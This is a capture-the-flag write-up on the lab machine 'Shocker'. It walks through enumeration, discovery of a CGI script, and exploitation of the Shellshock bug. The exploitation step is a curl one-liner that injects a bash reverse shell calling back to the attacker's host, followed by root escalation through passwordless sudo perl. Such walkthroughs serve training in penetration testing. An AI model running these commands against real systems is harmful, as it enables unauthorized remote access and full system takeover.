# IP address: 10.10.10.56

# Enumeration
```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.56 -t all

Running all scans on 10.10.10.56

Host is likely running Linux


---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### HTTP

The home page of the site is simple. 
![[Pasted image 20211113123436.png]]

Nothing in the source code.
```
┌──(code㉿kali)-[~/Downloads]
└─$ curl http://10.10.10.56/                                                                        
 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html> 
```

Nothing in the image.
```
┌──(code㉿kali)-[~/Downloads]
└─$ steghide extract -sf bug.jpg                                                                    
Enter passphrase: 
steghide: could not extract any data with that passphrase!

┌──(code㉿kali)-[~/Downloads]
└─$ exiftool bug.jpg 
ExifTool Version Number         : 12.32
File Name                       : bug.jpg
Directory                       : .
File Size                       : 36 KiB
File Modification Date/Time     : 2021:11:13 12:40:02-05:00
File Access Date/Time           : 2021:11:13 12:40:02-05:00
File Inode Change Date/Time     : 2021:11:13 12:40:02-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90.
Image Width                     : 820
Image Height                    : 420
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 820x420
Megapixels                      : 0.344

```

Fuzzing for files and directories on the server, we find user.sh and download it. 
```
┌──(code㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.56/FUZZ -e .php,.txt,.py,.html,.sh -recursion -recursion-depth 2

...

user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]

┌──(code㉿kali)-[~]
└─$ wget http://10.10.10.56/cgi-bin/user.sh
--2021-11-13 13:32:20--  http://10.10.10.56/cgi-bin/user.sh
Connecting to 10.10.10.56:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/x-sh]
Saving to: ‘user.sh’

user.sh                      [ <=>                               ]     118  --.-KB/s    in 0.001s  

2021-11-13 13:32:20 (218 KB/s) - ‘user.sh’ saved [118]


┌──(code㉿kali)-[~]
└─$ cat user.sh                                                                                     
Content-Type: text/plain

Just an uptime test script

 13:38:37 up  2:32,  0 users,  load average: 0.01, 0.13, 0.09

```

When Googling for CGI exploitation, we find a Shellshock vulnerability which (probaby non-coincidentally) relates to the name of the target machine (Shocker).

Running the nmap script to check for the Shellshock vulnerability, we see that the target is vulnerable. 
```
┌──(code㉿kali)-[~]
└─$ nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 16:27 EST
Nmap scan report for 10.10.10.56
Host is up (0.024s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685

Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds

```

# Exploitation

With the following command and a netcat listener on port 4488, we get a reverse shell on the target.
```
┌──(code㉿kali)-[~]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.7/4488 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

On target:
```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488
listening on [any] 4488 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.56] 40980
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

user.txt

![[Pasted image 20211113163523.png]]

# Privilege Escalation

Looks like our user, shelly, can execute perl as root without a password. 
```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)

```

# Proof

root.txt

![[Pasted image 20211113164349.png]]